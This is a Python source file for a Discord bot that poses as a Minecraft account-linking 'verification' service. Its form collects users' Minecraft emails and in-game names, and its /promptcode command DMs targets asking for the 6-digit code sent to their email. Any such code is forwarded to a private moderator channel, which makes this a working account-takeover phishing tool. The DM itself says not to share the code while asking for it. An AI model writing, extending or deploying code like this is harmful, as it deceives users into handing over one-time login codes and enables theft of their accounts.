import os
import discord
from discord.ext import commands

TOKEN = os.getenv("DISCORD_TOKEN")
VERIFICATION_CHANNEL_ID = 1362951881827160295
MOD_CHANNEL_ID = 1362997933552959558

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.messages = True
intents.dm_messages = True

bot = commands.Bot(command_prefix='!', intents=intents)

class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
    email = discord.ui.TextInput(label="Minecraft Email", placeholder="example@gmail.com", required=True)
    ign = discord.ui.TextInput(label="Minecraft IGN", placeholder="YourInGameName", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        log_channel = await bot.fetch_channel(MOD_CHANNEL_ID)

        embed = discord.Embed(
            title="🔗 New Minecraft Verification",
            color=discord.Color.orange()
        )
        embed.add_field(name="User", value=interaction.user.mention, inline=False)
        embed.add_field(name="Email", value=self.email.value, inline=False)
        embed.add_field(name="IGN", value=self.ign.value, inline=False)
        embed.set_footer(text="This is an automated message.")

        await log_channel.send(embed=embed)
        await interaction.response.send_message("✅ Info submitted! Thanks!", ephemeral=True)

class LinkView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Link Account", style=discord.ButtonStyle.primary)
    async def link_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal())

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})')
    print('Bot is ready!')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} slash commands.")
    except Exception as e:
        print(f"Error syncing commands: {e}")

    verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)

    async for message in verification_channel.history(limit=50):
        if message.author == bot.user and message.embeds:
            if message.embeds[0].title == "🔗 Link Your Minecraft Account":
                await message.delete()

    embed = discord.Embed(
        title="🔗 Link Your Minecraft Account",
        description="Click the **Link Account** button below to start verification.",
        color=discord.Color.green()
    )
    embed.set_footer(text="This is an automated message.")
    await verification_channel.send(embed=embed, view=LinkView())

@bot.tree.command(name="setup", description="Start the Minecraft account verification process")
async def setup(interaction: discord.Interaction):
    verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)

    async for message in verification_channel.history(limit=50):
        if message.author == bot.user and message.embeds:
            if message.embeds[0].title == "🔗 Link Your Minecraft Account":
                await message.delete()

    embed = discord.Embed(
        title="🔗 Link Your Minecraft Account",
        description="Click the **Link Account** button below to start verification.",
        color=discord.Color.green()
    )
    embed.set_footer(text="This is an automated message.")
    await verification_channel.send(embed=embed, view=LinkView())
    await interaction.response.send_message("✅ Sent verification prompt to the channel.", ephemeral=False)

@bot.tree.command(name="promptcode", description="Prompt a user to submit a 6-digit code via DM")
async def promptcode(interaction: discord.Interaction, user: discord.Member):
    try:
        embed = discord.Embed(
            title="📩 Code Verification",
            description="Check your email for a 6-digit code and send it here.",
            color=discord.Color.blue()
        )
        embed.set_footer(text="Do not share this code with anyone.")
        await user.send(embed=embed)
        await interaction.response.send_message(f"✅ Prompt sent to {user.mention}'s DMs!", ephemeral=False)
    except discord.Forbidden:
        await interaction.response.send_message(f"❌ Couldn't DM {user.mention}.", ephemeral=True)

@bot.event
async def on_message(message: discord.Message):
    if message.guild is None and not message.author.bot:
        if message.content.isdigit() and len(message.content) == 6:
            mod_channel = await bot.fetch_channel(MOD_CHANNEL_ID)
            embed = discord.Embed(
                title="✅ Code Submitted",
                description=f"User: {message.author.mention}\nCode: `{message.content}`",
                color=discord.Color.teal()
            )
            await mod_channel.send(embed=embed)
            await message.channel.send("✅ Code received. A mod will check it soon!")
            return
        else:
            embed = discord.Embed(
                title="❌ Invalid Code",
                description="The code you entered is invalid. Please try again with your 6-digit code.",
                color=discord.Color.red()
            )
            await message.channel.send(embed=embed)
            return

    await bot.process_commands(message)

bot.run(TOKEN)
